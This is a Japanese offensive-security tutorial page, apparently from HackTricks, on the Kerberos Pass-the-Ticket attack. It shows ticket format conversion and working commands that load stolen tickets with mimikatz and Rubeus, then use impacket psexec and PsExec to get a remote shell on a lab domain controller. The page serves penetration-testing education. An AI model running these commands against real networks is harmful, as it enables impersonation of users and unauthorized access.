# パス・ザ・チケット

{{#include ../../banners/hacktricks-training.md}}

## パス・ザ・チケット (PTT)

**パス・ザ・チケット (PTT)** 攻撃手法では、攻撃者は **ユーザーの認証チケットを盗む** ことで、パスワードやハッシュ値を盗むのではありません。この盗まれたチケットは **ユーザーになりすます** ために使用され、ネットワーク内のリソースやサービスに不正にアクセスします。

**読む**:

- [Windowsからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linuxからのチケットの収集](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **プラットフォーム間でのLinuxとWindowsのチケットの交換**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) ツールは、チケット自体と出力ファイルを使用してチケット形式を変換します。
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windowsでは[Kekeo](https://github.com/gentilkiwi/kekeo)が使用できます。

### パス・ザ・チケット攻撃
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 参考文献

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
